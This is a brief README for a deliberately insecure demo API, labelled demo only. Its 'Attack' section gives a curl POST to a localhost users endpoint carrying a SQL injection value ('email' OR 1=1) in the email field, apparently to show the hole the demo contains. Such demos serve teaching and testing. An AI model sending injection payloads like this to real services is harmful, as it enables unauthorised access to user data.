# unsecure-api
**DEMO ONLY** | Don't use in production

## Attack

```
curl -L -X POST 'http://localhost:3000/users' \
-H 'Content-Type: application/json' \
--data '{
  "email": "'email' OR 1=1"
}'
```